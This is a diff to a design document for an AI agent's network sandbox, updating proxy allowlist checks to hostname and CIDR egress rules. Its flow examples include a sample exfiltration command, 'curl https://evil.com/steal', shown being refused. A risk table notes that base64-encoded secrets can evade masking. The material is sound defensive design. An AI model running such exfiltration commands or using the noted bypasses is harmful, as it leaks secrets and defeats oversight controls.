@@ -16,7 +16,7 @@ Secrets are injected via environment variables (`CCLAW_SECRET_<NAME>`), never in
 | Env stripping | Unset CCLAW_*, API keys before exec | No (app-level) |
 | Secret injection | `CCLAW_SECRET_*` env vars (selective) | No (app-level) |
 | Output masking | Replace secret values with `[REDACTED]` | No (app-level) |
-| Allowlist | Proxy checks `allowed_hosts` before connect | No (app-level) |
+| Allowlist | Proxy checks egress rules (hostname + CIDR) before connect | No (app-level) |
 
 Key insight: `CLONE_NEWNET` is the hard boundary. Everything else is convenience/defense-in-depth. A static binary that bypasses LD_PRELOAD gets zero network, not unrestricted network.
 
@@ -30,7 +30,7 @@ Key insight: `CLONE_NEWNET` is the hard boundary. Everything else is convenience
 │  │ Agent loop  │     │ Proxy thread                  │  │
 │  │ (LLM, tools)│     │ - listens on .proxy.sock     │  │
 │  └──────┬──────┘     │ - reads preamble (host:port) │  │
-│         │            │ - checks allowed_hosts        │  │
+│         │            │ - checks egress rules         │  │
 │         │ fork       │ - resolves DNS                │  │
 │         ▼            │ - opens real TCP, relays      │  │
 │  ┌─────────────┐     └──────────────┬───────────────┘  │
@@ -58,7 +58,7 @@ shell: curl https://api.github.com/repos
   2. libcclaw_net.so intercepts connect()
   3. lib opens UDS to <workspace>/.proxy.sock
   4. lib sends preamble: "api.github.com:443\n"
-  5. proxy reads preamble, checks allowed_hosts → allowed
+  5. proxy reads preamble, checks egress rules → allowed
   6. proxy resolves api.github.com, opens real TCP:443
   7. proxy relays bytes bidirectionally (TLS passthrough)
   8. curl does TLS handshake directly with api.github.com
@@ -68,7 +68,7 @@ shell: curl https://api.github.com/repos
 shell: curl https://evil.com/steal
   1. curl calls connect("evil.com", 443)
   2. libcclaw_net.so intercepts, opens UDS, sends "evil.com:443\n"
-  3. proxy checks allowed_hosts → NOT listed
+  3. proxy checks egress rules → NOT listed
   4. proxy closes UDS (connection refused)
   5. curl gets ECONNREFUSED
 
@@ -85,6 +85,13 @@ Minimal shared library (~200 LOC). Intercepts:
 
 - `connect()` — if AF_INET/AF_INET6 TCP, route through UDS; else passthrough (AF_UNIX, UDP)
 - `getaddrinfo()` — forward through UDS for proxy-side resolution (optional; can also just let the connect preamble carry the hostname)
+
+**Egress rule model** (as of 2026-06): the proxy partitions per-agent grants
+into two sets at `proxy_bind` time: hostname rules (exact + `.`-prefix suffix
+match, case-insensitive) and CIDR rules (parsed IPv4/IPv6 CIDRs + bare literal
+IPs stored as /32 or /128). A CONNECT or RESOLVE request is admitted if either
+set matches. Private/metadata IPs have additional constraints — see
+`specs/egress-filter.md` §4 and §6. Default-deny: no rules → no egress.
 
 Protocol over UDS:
 ```
@@ -140,7 +147,7 @@ LLM is told: "You have these secrets available as env vars: `$CCLAW_SECRET_GITHU
 | Risk | Rationale |
 |------|-----------|
 | LD_PRELOAD bypassable by static binaries | CLONE_NEWNET catches them (zero network) |
-| Base64-encoded secrets evade masking | Low probability; allowed_hosts limits damage |
+| Base64-encoded secrets evade masking | Low probability; egress allowlist limits damage |
 | Shell child has secret in env memory | Ephemeral process; same as any CLI tool using env vars |
 | Proxy sees all traffic in plaintext (TLS passthrough) | Proxy only sees encrypted bytes; no MITM |
 
